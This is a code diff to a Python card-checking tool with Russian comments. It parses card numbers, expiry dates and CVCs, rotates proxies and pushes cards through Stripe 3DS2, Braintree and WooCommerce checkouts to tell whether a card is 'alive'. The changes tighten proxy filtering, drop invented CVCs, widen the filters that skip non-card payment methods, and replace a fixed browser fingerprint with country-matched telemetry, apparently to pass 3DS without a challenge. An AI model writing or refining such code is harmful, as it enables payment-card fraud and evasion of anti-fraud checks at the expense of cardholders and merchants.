@@ -245,7 +245,7 @@ def parse_card(raw: str) -> dict:
     yy_4 = "20" + yy[-2:] if len(yy) <= 2 else yy
     yy_2 = yy_4[-2:]
     cvc_raw = parts[3].strip() if len(parts) > 3 else ""
-    cvc = cvc_raw if cvc_raw else f"{random.randint(0, 999):03d}"
+    cvc = cvc_raw if cvc_raw else ""
     return {
         "number": number,
         "month": mm,
@@ -268,14 +268,33 @@ def mask_pan(raw: str) -> str:
 PROXIES_FILE = os.path.join("data", "proxies.txt")
 
 
+def _is_valid_port(port_str: str) -> bool:
+    try:
+        val = int(port_str)
+        return 1 <= val <= 65535
+    except (ValueError, TypeError):
+        return False
+
+
+def _is_valid_host(host_str: str) -> bool:
+    if not host_str:
+        return False
+    h = host_str.strip("[]")
+    if h.isdigit():
+        return False
+    return bool(re.match(r"^[A-Za-z0-9_.-]+$", h))
+
+
 def normalize_proxy(line: str | None) -> str | None:
-    """Нормализует любую строку прокси в валидный URL со схемой:
+    """Нормализует строку прокси в валидный URL со схемой:
     - host:port | SOCKS5 | 119ms -> socks5://host:port
     - host:port | SOCKS4 | 118ms -> socks4://host:port
     - host:port | HTTP | 36ms   -> http://host:port
     - scheme://user:pass@host:port -> сохраняет схему
     - host:port:user:pass        -> http://user:pass@host:port
     - host:port                  -> http://host:port
+
+    Карточные строки (PAN|MM|YY|CVC), мусор и пустые строки отсекаются (возвращают None).
     """
     if not line:
         return None
@@ -285,17 +304,38 @@ def normalize_proxy(line: str | None) -> str | None:
     if "|" in p:
         parts = [seg.strip() for seg in p.split("|")]
         host_port = parts[0]
+        if ":" not in host_port:
+            return None
+        host, _, port = host_port.partition(":")
+        if not _is_valid_host(host) or not _is_valid_port(port):
+            return None
         proto = parts[1].lower() if len(parts) > 1 else "http"
+        if not any(k in proto for k in ("socks5", "socks4", "http", "https")):
+            return None
         scheme = "socks5" if "socks5" in proto else ("socks4" if "socks4" in proto else "http")
         return f"{scheme}://{host_port}"
     if "://" in p:
-        return p
+        scheme, _, rest = p.partition("://")
+        if scheme.lower() not in ("http", "https", "socks4", "socks4a", "socks5", "socks5h"):
+            return None
+        hp = rest.rsplit("@", 1)[-1].split("/")[0]
+        if ":" in hp:
+            h, _, port = hp.rpartition(":")
+            if _is_valid_host(h) and _is_valid_port(port):
+                return p
+        return None
     toks = p.split(":")
     if len(toks) == 4:
-        return f"http://{toks[2]}:{toks[3]}@{toks[0]}:{toks[1]}"
+        if _is_valid_host(toks[0]) and _is_valid_port(toks[1]):
+            return f"http://{toks[2]}:{toks[3]}@{toks[0]}:{toks[1]}"
+        elif _is_valid_host(toks[2]) and _is_valid_port(toks[3]):
+            return f"http://{toks[0]}:{toks[1]}@{toks[2]}:{toks[3]}"
+        return None
     elif len(toks) == 2:
-        return f"http://{p}"
-    return f"http://{p}"
+        if _is_valid_host(toks[0]) and _is_valid_port(toks[1]):
+            return f"http://{p}"
+        return None
+    return None
 
 
 def load_proxies(path: str = PROXIES_FILE) -> list[str]:
@@ -727,21 +767,11 @@ async def stripe_confirm_pi(session, pk: str, secret: str, pm_id: str,
         return {"error": {"type": "network_error", "message": f"{type(e).__name__}: {e}"}}
 
 
-async def stripe_3ds2_authenticate(session, pk: str, source_id: str) -> dict:
+async def stripe_3ds2_authenticate(session, pk: str, source_id: str, country_code: str = "US") -> dict:
     """3DS2 fingerprint/challenge-вход. transStatus Y → frictionless,
     C → challenge (карта жива и enrolled), иначе failed."""
-    browser = {
-        "fingerprintAttempted": True,
-        "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "language": "en-US",
-        "colorDepth": 24,
-        "screenHeight": 1080,
-        "screenWidth": 1920,
-        "timeZoneOffset": -120,
-        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
-        "javaEnabled": False,
-        "javascriptEnabled": True,
-    }
+    from frictionless_engine import build_browser_telemetry
+    browser = build_browser_telemetry(country_code=country_code)
     import json as _json
     try:
         r = await session.post(
@@ -1388,8 +1418,10 @@ def _braintree_verdict(pm: dict) -> tuple[str, str] | dict:
 
 
 _PM_WALLET_RX = re.compile(
-    r"applepay|googlepay|ideal|bancontact|sepa|klarna|afterpay|affirm|alipay|"
-    r"wechat|eps|p24|multibanco|boleto|oxxo|blik|fpx|becs|ach|grabpay|paypal|ppcp",
+    r"applepay|googlepay|ideal|bancontact|sepa|klarna|kco|afterpay|affirm|clearpay|"
+    r"alipay|wechat|eps|p24|multibanco|boleto|oxxo|blik|fpx|becs|ach|grabpay|paypal|"
+    r"ppcp|amazon|link|cashapp|acss|bacs|giropay|sofort|mybank|trustly|pay_upon_invoice|"
+    r"us_bank",
     re.I)
 
 # Способы оплаты, которые карту не принимают в принципе. Без этого фильтра
@@ -1397,8 +1429,8 @@ _PM_WALLET_RX = re.compile(
 # отвечает payment_method_disabled, а карта уже токенизирована и потрачена зря.
 _PM_NONCARD_RX = re.compile(
     r"invoice|rechnung|kauf|cod|cash_on|cheque|check_payments|bacs|bank_transfer|"
-    r"banktransfer|direct_bank|gateway_fee|store_credit|gift_card|" 
-    r"purchase_order|cheque|cod|free", re.I)
+    r"banktransfer|direct_bank|gateway_fee|store_credit|gift_card|"
+    r"purchase_order|free", re.I)
 
 
 def _pick_pm_slug(methods: list) -> str:
@@ -1905,14 +1937,9 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                 card_plausible = ("stripe_cc", "stripe_card", "stripe_upm",
                                   "ppcp_card", "woocommerce_payments",
                                   "woocommerce_payments_card", "pronamic_pay")
-                wallet_rx = re.compile(
-                    r"alipay|wechat|amazon|klarna|kco|affirm|afterpay|clearpay|"
-                    r"blik|eps|bancontact|boleto|ideal|oxxo|sepa|us_bank|p24|"
-                    r"multibanco|link|cashapp|acss|bacs|becs|cheque|cod|giropay|"
-                    r"sofort|mybank|trustly|pay_upon_invoice")
                 order = sorted(
                     (e for e in enum if e and e != "stripe"
-                     and not wallet_rx.search(e)),
+                     and not _PM_WALLET_RX.search(e)),
                     key=lambda e: (e not in card_plausible,
                                    not e.startswith("stripe")))
                 nxt = next((e for e in order if e not in tried), None)
